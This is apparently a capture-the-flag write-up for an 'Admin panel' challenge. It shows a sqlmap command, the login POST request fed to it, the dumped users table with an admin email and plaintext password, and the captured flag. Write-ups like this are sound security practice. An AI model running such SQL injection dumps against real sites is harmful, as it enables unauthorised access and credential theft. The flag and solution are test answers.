@@ -1,0 +1,32 @@
+Admin panel
+-----------
+
+
+sqlmap -r req -D sqli -T users --dump
+
+The "req" file:
+POST /login.php HTTP/1.1
+Host: 89.38.208.143:20003
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+DNT: 1
+Connection: close
+Referer: http://89.38.208.143:20003/
+Upgrade-Insecure-Requests: 1
+
+email=bobi%40gmail.com&password=
+
+The result:
++----+-------------------------+---------------+
+| id | email                   | password      |
++----+-------------------------+---------------+
+| 1  | admin.timctf@banatit.ro | imiplacepizza |
++----+-------------------------+---------------+
+
+Flag:TIMCTF{SqL_1nj3ct1on_1s_b4ck_1n_town}
+
+Straightforward challenge, only had to run sqlmap on the  login post request.
